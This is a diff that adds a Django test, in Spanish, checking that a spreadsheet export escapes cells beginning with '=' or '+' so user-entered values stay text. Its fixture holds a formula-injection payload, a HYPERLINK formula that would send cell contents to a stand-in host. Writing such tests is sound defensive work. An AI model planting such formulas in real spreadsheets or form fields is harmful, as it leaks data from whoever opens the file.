@@ -416,3 +416,16 @@ def test_la_carga_rechaza_correos_no_institucionales_o_repetidos(cliente, db):
     assert "institucional" in mensajes
     assert "Es obligatorio" in mensajes
     assert "Repetido en la fila 4" in mensajes
+
+
+def test_un_valor_que_empieza_por_igual_baja_como_texto(cliente, db):
+    """Auditoría de seguridad, 29/10/2026: lo que ya está registrado lo escribió
+    un usuario, y una celda que empiece por «=» se ejecutaría como fórmula."""
+    Sede.objects.create(nombre='=HYPERLINK("http://x.test/?"&A1,"Ver")', ciudad="+Quito")
+
+    respuesta = cliente.get(f"{BASE}/sedes/plantilla/")
+
+    hoja = load_workbook(BytesIO(respuesta.content))["Sedes"]
+    assert hoja.cell(row=2, column=1).value == '\'=HYPERLINK("http://x.test/?"&A1,"Ver")'
+    assert hoja.cell(row=2, column=1).data_type == "s"
+    assert hoja.cell(row=2, column=2).value == "'+Quito"
